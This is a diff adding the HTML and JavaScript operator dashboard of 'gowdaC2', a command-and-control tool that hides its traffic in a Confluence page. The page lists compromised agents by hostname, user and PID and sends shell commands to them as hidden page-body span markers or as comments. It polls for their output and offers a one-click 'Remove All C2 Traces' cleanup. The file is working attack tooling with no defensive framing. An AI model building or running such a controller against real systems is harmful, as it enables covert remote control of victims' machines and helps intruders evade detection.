@@ -1,0 +1,431 @@
+<!-- Author: Dhanush Arvind -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>gowdaC2 // Confluence</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a2626;color:#b0d0d0;font-family:Consolas,'Courier New',monospace;font-size:13px;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+
+.toolbar{background:#0f2e2e;border-bottom:1px solid #1a4a4a;padding:4px 8px;display:flex;gap:3px;align-items:center;height:34px}
+.toolbar .btn{background:none;border:1px solid transparent;color:#60a0a0;padding:3px 8px;cursor:pointer;font-size:14px;border-radius:3px;font-family:inherit}
+.toolbar .btn:hover{background:#1a4a4a;border-color:#2a6060;color:#a0e0e0}
+.toolbar .btn.active{color:#00ff88;border-color:#00ff88}
+.toolbar .sep{width:1px;height:20px;background:#1a4a4a;margin:0 4px}
+.toolbar .title{color:#405858;font-size:11px;margin-left:auto}
+.toolbar .status-dot{width:8px;height:8px;border-radius:50%;margin-left:8px}
+.toolbar .status-dot.ok{background:#00cc66}
+.toolbar .status-dot.err{background:#cc3333}
+
+.tabs{background:#0c2828;display:flex;border-bottom:1px solid #1a4a4a}
+.tab{padding:6px 16px;cursor:pointer;color:#507070;border-bottom:2px solid transparent;font-size:12px;user-select:none;font-family:inherit}
+.tab:hover{color:#a0d0d0}
+.tab.active{color:#00ff88;border-bottom-color:#00ff88}
+
+.views{flex:1;overflow:hidden;position:relative}
+.view{position:absolute;inset:0;overflow:auto;display:none;padding:0}
+.view.active{display:flex;flex-direction:column}
+
+.bt{width:100%;border-collapse:collapse}
+.bt th{background:#0e2a2a;color:#507070;padding:7px 10px;text-align:left;font-weight:normal;font-size:11px;text-transform:uppercase;letter-spacing:.8px;border-bottom:1px solid #1a4a4a;position:sticky;top:0;z-index:1}
+.bt td{padding:6px 10px;border-bottom:1px solid #0c2424;font-size:12px}
+.bt tr:hover{background:#0e2222;cursor:pointer}
+.bt tr.sel{background:#132828}
+.st{font-weight:bold;color:#00cc66}
+
+#v-console{flex-direction:column}
+.con-hdr{background:#0e2a2a;padding:7px 12px;border-bottom:1px solid #1a4a4a;display:flex;justify-content:space-between;align-items:center;font-size:12px}
+.con-hdr .bid{color:#00ff88}
+.con-hdr .mode-toggle{display:flex;gap:0;border:1px solid #1a4a4a;border-radius:3px;overflow:hidden}
+.con-hdr .mode-btn{background:none;border:none;color:#607878;padding:3px 10px;cursor:pointer;font:inherit;font-size:11px}
+.con-hdr .mode-btn.active{background:#00663a;color:#00ff88}
+.con-hdr .mode-btn:hover:not(.active){background:#1a4a4a;color:#b0d0d0}
+.con-out{flex:1;overflow-y:auto;padding:10px 12px;background:#070e0e;font-size:12px;line-height:1.7;user-select:text;white-space:pre-wrap;word-break:break-all}
+.con-out .c{color:#00ff88}
+.con-out .o{color:#b0d0d0}
+.con-out .e{color:#ff6666}
+.con-out .y{color:#606060;font-style:italic}
+.con-out .ts{color:#304040;font-size:10px}
+.con-in{display:flex;border-top:1px solid #1a4a4a;background:#0a1818;align-items:center}
+.con-in .pr{padding:7px 8px;color:#00ff88;white-space:nowrap;font-size:12px}
+.con-in input{flex:1;background:none;border:none;color:#e0e0e0;font:inherit;padding:7px;outline:none}
+.con-in .ibtn{background:none;border:1px solid #1a4a4a;color:#60a0a0;padding:4px 8px;cursor:pointer;font-size:11px;border-radius:3px;margin-right:6px;white-space:nowrap;font-family:inherit}
+.con-in .ibtn:hover{background:#1a4a4a;color:#a0e0e0}
+
+#v-output{flex-direction:column}
+.out-bar{background:#0e2a2a;padding:7px 12px;border-bottom:1px solid #1a4a4a;display:flex;gap:8px;align-items:center;font-size:12px}
+.out-bar select{background:#081818;border:1px solid #1a4a4a;color:#e0e0e0;padding:3px 8px;border-radius:3px;font:inherit;font-size:11px}
+.out-body{flex:1;overflow-y:auto;padding:10px 12px;background:#070e0e;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+.out-entry{margin-bottom:12px;border-left:2px solid #1a4a4a;padding-left:10px}
+.out-entry .hdr{color:#00ff88;font-size:11px;margin-bottom:2px}
+.out-entry .body{color:#b0d0d0}
+
+#v-cleanup{padding:20px;align-items:flex-start;gap:16px}
+.cleanup-box{background:#0e2a2a;border:1px solid #1a4a4a;border-radius:5px;padding:20px;max-width:500px}
+.cleanup-box h3{color:#00ff88;font-size:14px;margin-bottom:10px}
+.cleanup-box p{color:#708888;font-size:12px;margin-bottom:14px;line-height:1.6}
+.cleanup-box .cbtn{background:#662222;border:1px solid #cc3333;color:#ff6666;padding:8px 20px;cursor:pointer;font:inherit;font-size:12px;border-radius:4px}
+.cleanup-box .cbtn:hover{background:#883333}
+.cleanup-box .result{margin-top:12px;color:#b0d0d0;font-size:12px;display:none}
+.cleanup-box .result.show{display:block}
+
+.elog{background:#070e0e;border-top:1px solid #1a4a4a;height:90px;overflow-y:auto;padding:5px 10px;font-size:11px;flex-shrink:0}
+.elog .ev{padding:1px 0}
+.elog .t{color:#304040}
+.elog .m{color:#607070}
+.elog .m.agent{color:#00ff88}
+.elog .m.cmd{color:#ffcc00}
+.elog .m.out{color:#60a0a0}
+.elog .m.err{color:#ff6666}
+.elog .m.clean{color:#cc88ff}
+
+.empty{color:#304040;font-size:14px;padding:40px 20px;text-align:center}
+
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:#0a2626}
+::-webkit-scrollbar-thumb{background:#1a4a4a;border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:#2a6060}
+</style>
+</head>
+<body>
+
+<div class="toolbar">
+  <button class="btn" title="Refresh" onclick="refresh()">REFRESH</button>
+  <span class="sep"></span>
+  <button class="btn" title="Agents" onclick="sv('agents')">AGENTS</button>
+  <button class="btn" title="Console" onclick="sv('console')">CONSOLE</button>
+  <button class="btn" title="Output" onclick="sv('output')">OUTPUT</button>
+  <button class="btn" title="Cleanup" onclick="sv('cleanup')">CLEANUP</button>
+  <span class="title">gowdaC2 // Confluence</span>
+  <div class="status-dot" id="statusDot" title="Checking..."></div>
+</div>
+
+<div class="tabs">
+  <div class="tab active" data-v="agents" onclick="sv('agents')">AGENTS</div>
+  <div class="tab" data-v="console" onclick="sv('console')">CONSOLE</div>
+  <div class="tab" data-v="output" onclick="sv('output')">OUTPUT</div>
+  <div class="tab" data-v="cleanup" onclick="sv('cleanup')">CLEANUP</div>
+</div>
+
+<div class="views">
+  <div id="v-agents" class="view active">
+    <table class="bt"><thead><tr>
+      <th>Agent ID</th><th>Hostname</th><th>Username</th><th>PID</th><th>Registered</th>
+    </tr></thead><tbody id="agentBody"></tbody></table>
+    <div class="empty" id="agentEmpty">No agents registered. Waiting for caller check-in...</div>
+  </div>
+
+  <div id="v-console" class="view">
+    <div class="con-hdr">
+      <span>Target: <span class="bid" id="consoleBid">none</span></span>
+      <div class="mode-toggle">
+        <button class="mode-btn active" id="modeBody" onclick="setMode('body')">Page Body</button>
+        <button class="mode-btn" id="modeComment" onclick="setMode('comment')">Comment</button>
+      </div>
+    </div>
+    <div class="con-out" id="consoleOut"><span class="y">Select an agent from the Agents tab, then type commands here.\nUse Page Body mode for hidden span commands, Comment mode for browser-visible commands.</span></div>
+    <div class="con-in">
+      <span class="pr">confluence [<span id="consolePr">-</span>] &gt;</span>
+      <input id="consoleIn" placeholder="Enter command..." onkeydown="handleKey(event)">
+      <button class="ibtn" onclick="sendCmd()">Send</button>
+    </div>
+  </div>
+
+  <div id="v-output" class="view">
+    <div class="out-bar">
+      <span>Filter agent:</span>
+      <select id="outFilter" onchange="loadOutput()">
+        <option value="">All agents</option>
+      </select>
+      <button class="ibtn" onclick="loadOutput()" style="font-size:11px">Refresh</button>
+    </div>
+    <div class="out-body" id="outBody">
+      <div class="empty">No output yet.</div>
+    </div>
+  </div>
+
+  <div id="v-cleanup" class="view">
+    <div class="cleanup-box">
+      <h3>Cleanup C2 Traces</h3>
+      <p>This will remove all C2:TASK markers from the page body and delete all C2-related comments (registrations, output, and command comments).</p>
+      <button class="cbtn" onclick="doCleanup()">Remove All C2 Traces</button>
+      <div class="result" id="cleanupResult"></div>
+    </div>
+  </div>
+</div>
+
+<div class="elog" id="elog"></div>
+
+<script>
+var selectedAgent = null;
+var sendMode = 'body';
+var cmdHistory = [];
+var histIdx = -1;
+var knownOutput = {};
+var agentPollTimer = null;
+var outputPollTimer = null;
+
+function log(msg, cls) {
+  var el = document.getElementById('elog');
+  var ts = new Date().toLocaleTimeString();
+  var d = document.createElement('div');
+  d.className = 'ev';
+  d.innerHTML = '<span class="t">[' + ts + ']</span> <span class="m ' + (cls||'') + '">' + esc(msg) + '</span>';
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+function esc(s) {
+  var d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
+function sv(name) {
+  document.querySelectorAll('.view').forEach(function(v) { v.classList.remove('active'); });
+  document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+  var v = document.getElementById('v-' + name);
+  if (v) v.classList.add('active');
+  var t = document.querySelector('.tab[data-v="' + name + '"]');
+  if (t) t.classList.add('active');
+  if (name === 'agents') loadAgents();
+  if (name === 'output') loadOutput();
+}
+
+function refresh() {
+  loadAgents();
+  loadOutput();
+  checkStatus();
+  log('Refreshed all data');
+}
+
+function checkStatus() {
+  fetch('/api/status').then(function(r) { return r.json(); }).then(function(d) {
+    var dot = document.getElementById('statusDot');
+    if (d.connected) {
+      dot.className = 'status-dot ok';
+      dot.title = 'Connected to ' + d.url + ' page ' + d.page_id;
+    } else {
+      dot.className = 'status-dot err';
+      dot.title = 'Connection failed';
+    }
+  }).catch(function() {
+    document.getElementById('statusDot').className = 'status-dot err';
+  });
+}
+
+function loadAgents() {
+  fetch('/api/agents').then(function(r) { return r.json(); }).then(function(d) {
+    var tbody = document.getElementById('agentBody');
+    var empty = document.getElementById('agentEmpty');
+    var agents = d.agents || [];
+    if (agents.length === 0) {
+      tbody.innerHTML = '';
+      empty.style.display = 'block';
+      return;
+    }
+    empty.style.display = 'none';
+    tbody.innerHTML = '';
+
+    var filterSel = document.getElementById('outFilter');
+    var existingVals = {};
+    for (var i = 0; i < filterSel.options.length; i++) existingVals[filterSel.options[i].value] = true;
+
+    agents.forEach(function(a) {
+      var tr = document.createElement('tr');
+      if (selectedAgent === a.agent_id) tr.className = 'sel';
+      tr.onclick = function() { selectAgent(a.agent_id); };
+      var ts = a.registered || '?';
+      if (ts !== '?') {
+        try { ts = new Date(ts).toLocaleString(); } catch(e) {}
+      }
+      tr.innerHTML =
+        '<td style="color:#00ff88;font-weight:bold">' + esc(a.agent_id) + '</td>' +
+        '<td>' + esc(a.hostname || '?') + '</td>' +
+        '<td>' + esc(a.username || '?') + '</td>' +
+        '<td>' + esc(String(a.pid || '?')) + '</td>' +
+        '<td style="color:#507070;font-size:11px">' + esc(ts) + '</td>';
+      tbody.appendChild(tr);
+
+      if (!existingVals[a.agent_id]) {
+        var opt = document.createElement('option');
+        opt.value = a.agent_id;
+        opt.textContent = a.agent_id + ' (' + (a.hostname||'?') + ')';
+        filterSel.appendChild(opt);
+      }
+    });
+  }).catch(function(e) {
+    log('Failed to load agents: ' + e, 'err');
+  });
+}
+
+function selectAgent(id) {
+  selectedAgent = id;
+  document.getElementById('consoleBid').textContent = id;
+  document.getElementById('consolePr').textContent = id;
+  document.querySelectorAll('#agentBody tr').forEach(function(tr) {
+    tr.classList.remove('sel');
+    if (tr.querySelector('td') && tr.querySelector('td').textContent === id) {
+      tr.classList.add('sel');
+    }
+  });
+  log('Selected agent: ' + id, 'agent');
+  sv('console');
+}
+
+function setMode(mode) {
+  sendMode = mode;
+  document.getElementById('modeBody').className = 'mode-btn' + (mode === 'body' ? ' active' : '');
+  document.getElementById('modeComment').className = 'mode-btn' + (mode === 'comment' ? ' active' : '');
+}
+
+function handleKey(e) {
+  if (e.key === 'Enter') { sendCmd(); return; }
+  if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (histIdx < cmdHistory.length - 1) {
+      histIdx++;
+      document.getElementById('consoleIn').value = cmdHistory[cmdHistory.length - 1 - histIdx];
+    }
+    return;
+  }
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (histIdx > 0) {
+      histIdx--;
+      document.getElementById('consoleIn').value = cmdHistory[cmdHistory.length - 1 - histIdx];
+    } else {
+      histIdx = -1;
+      document.getElementById('consoleIn').value = '';
+    }
+    return;
+  }
+}
+
+function appendConsole(html) {
+  var co = document.getElementById('consoleOut');
+  co.innerHTML += html;
+  co.scrollTop = co.scrollHeight;
+}
+
+function sendCmd() {
+  var input = document.getElementById('consoleIn');
+  var cmd = input.value.trim();
+  if (!cmd) return;
+  if (!selectedAgent) {
+    appendConsole('<div class="e">No agent selected. Click an agent in the Agents tab first.</div>');
+    return;
+  }
+
+  cmdHistory.push(cmd);
+  histIdx = -1;
+  input.value = '';
+
+  appendConsole('<div class="c">confluence [' + esc(selectedAgent) + '] &gt; ' + esc(cmd) + '</div>');
+
+  var url, body;
+  if (sendMode === 'body') {
+    url = '/api/task';
+    body = JSON.stringify({ agent_id: selectedAgent, command: cmd });
+  } else {
+    url = '/api/ctask';
+    body = JSON.stringify({ agent_id: selectedAgent, command: cmd });
+  }
+
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: body
+  }).then(function(r) { return r.json(); }).then(function(d) {
+    if (d.error) {
+      appendConsole('<div class="e">Error: ' + esc(d.error) + '</div>');
+      log('Command failed: ' + d.error, 'err');
+    } else {
+      var mode = sendMode === 'body' ? 'page-body' : 'comment';
+      var tid = d.task_id || d.comment_id || '?';
+      appendConsole('<div class="y">[' + mode + '] Sent (id=' + esc(tid) + ') — waiting for output...</div>');
+      log('Sent ' + mode + ' command to ' + selectedAgent + ': ' + cmd, 'cmd');
+    }
+  }).catch(function(e) {
+    appendConsole('<div class="e">Network error: ' + esc(String(e)) + '</div>');
+  });
+}
+
+function pollConsoleOutput() {
+  if (!selectedAgent) return;
+  fetch('/api/output?agent=' + selectedAgent).then(function(r) { return r.json(); }).then(function(d) {
+    var outputs = d.output || [];
+    outputs.forEach(function(o) {
+      var key = o.task_id + ':' + o.agent_id + ':' + o.time;
+      if (!knownOutput[key]) {
+        knownOutput[key] = true;
+        var ts = o.time;
+        try { ts = new Date(o.time).toLocaleTimeString(); } catch(e) {}
+        appendConsole(
+          '<div class="ts">[' + esc(ts) + ' task=' + esc(o.task_id) + ']</div>' +
+          '<div class="o">' + esc(o.output) + '</div>\n'
+        );
+      }
+    });
+  }).catch(function() {});
+}
+
+function loadOutput() {
+  var agent = document.getElementById('outFilter').value || '';
+  var url = '/api/output';
+  if (agent) url += '?agent=' + agent;
+  fetch(url).then(function(r) { return r.json(); }).then(function(d) {
+    var body = document.getElementById('outBody');
+    var outputs = d.output || [];
+    if (outputs.length === 0) {
+      body.innerHTML = '<div class="empty">No output yet.</div>';
+      return;
+    }
+    var html = '';
+    outputs.forEach(function(o) {
+      var ts = o.time;
+      try { ts = new Date(o.time).toLocaleString(); } catch(e) {}
+      html += '<div class="out-entry">' +
+        '<div class="hdr">[' + esc(ts) + '] agent=' + esc(o.agent_id) + ' task=' + esc(o.task_id) + '</div>' +
+        '<div class="body">' + esc(o.output) + '</div>' +
+        '</div>';
+    });
+    body.innerHTML = html;
+  }).catch(function(e) {
+    log('Failed to load output: ' + e, 'err');
+  });
+}
+
+function doCleanup() {
+  if (!confirm('Remove ALL C2 traces from the page? This deletes all C2 markers and comments.')) return;
+  var resultEl = document.getElementById('cleanupResult');
+  resultEl.className = 'result show';
+  resultEl.textContent = 'Cleaning up...';
+  fetch('/api/cleanup', { method: 'POST' }).then(function(r) { return r.json(); }).then(function(d) {
+    if (d.error) {
+      resultEl.textContent = 'Error: ' + d.error;
+      resultEl.style.color = '#ff6666';
+    } else {
+      var msg = 'Done. Page body ' + (d.page_cleaned ? 'cleaned' : 'already clean') +
+                '. Deleted ' + d.comments_deleted + ' comment(s).';
+      resultEl.textContent = msg;
+      resultEl.style.color = '#00ff88';
+      log(msg, 'clean');
+      knownOutput = {};
+    }
+  }).catch(function(e) {
+    resultEl.textContent = 'Error: ' + e;
+    resultEl.style.color = '#ff6666';
+  });
+}
+
+checkStatus();
+loadAgents();
+agentPollTimer = setInterval(loadAgents, 10000);
+outputPollTimer = setInterval(pollConsoleOutput, 5000);
+setInterval(checkStatus, 30000);
+log('Dashboard initialized', 'agent');
+</script>
+</body>
+</html>
